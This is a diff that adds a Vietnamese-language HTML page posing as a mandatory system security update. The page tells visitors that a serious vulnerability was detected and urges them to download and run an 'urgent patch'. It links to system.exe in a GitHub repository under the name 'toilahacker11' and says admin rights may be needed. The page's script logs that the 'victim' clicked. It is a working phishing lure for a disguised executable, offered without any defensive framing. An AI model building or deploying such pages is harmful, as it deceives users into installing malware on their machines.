@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cập nhật Hệ thống Quan trọng</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f0f2f5;
+            margin: 0;
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            background-color: #fff;
+            padding: 40px 50px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            width: 90%;
+            box-sizing: border-box;
+        }
+        h1 {
+            color: #d9534f;
+            margin-bottom: 20px;
+            font-size: 2em;
+        }
+        p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .download-button {
+            background-color: #28a745;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .download-button:hover {
+            background-color: #218838;
+        }
+        .footer-note {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Cập nhật Hệ thống Bắt buộc</h1>
+        <p>Hệ thống của bạn đã phát hiện một lỗ hổng bảo mật nghiêm trọng. Vui lòng tải xuống và chạy bản vá lỗi khẩn cấp để bảo vệ dữ liệu của bạn khỏi các mối đe dọa tiềm ẩn.</p>
+        <p>Bản cập nhật này sẽ cải thiện hiệu suất và độ ổn định của hệ điều hành. Vui lòng không đóng cửa sổ này cho đến khi quá trình hoàn tất.</p>
+        
+        <!-- Nút tải xuống liên kết trực tiếp tới file system.exe trên GitHub của bạn -->
+        <a id="downloadLink" href="https://raw.githubusercontent.com/toilahacker11/gamr/main/system.exe" download="system.exe" class="download-button">
+            Tải xuống và Cài đặt Bản cập nhật Ngay bây giờ
+        </a>
+
+        <p class="footer-note">Lưu ý: Bạn có thể cần cấp quyền quản trị để hoàn tất quá trình cài đặt.</p>
+    </div>
+
+    <script>
+        document.getElementById('downloadLink').addEventListener('click', function(event) {
+            console.log('Nạn nhân đã click để tải xuống bản cập nhật.');
+            // Bạn có thể thêm mã xử lý JavaScript tùy chỉnh tại đây nếu muốn
+        });
+    </script>
+</body>
+</html>
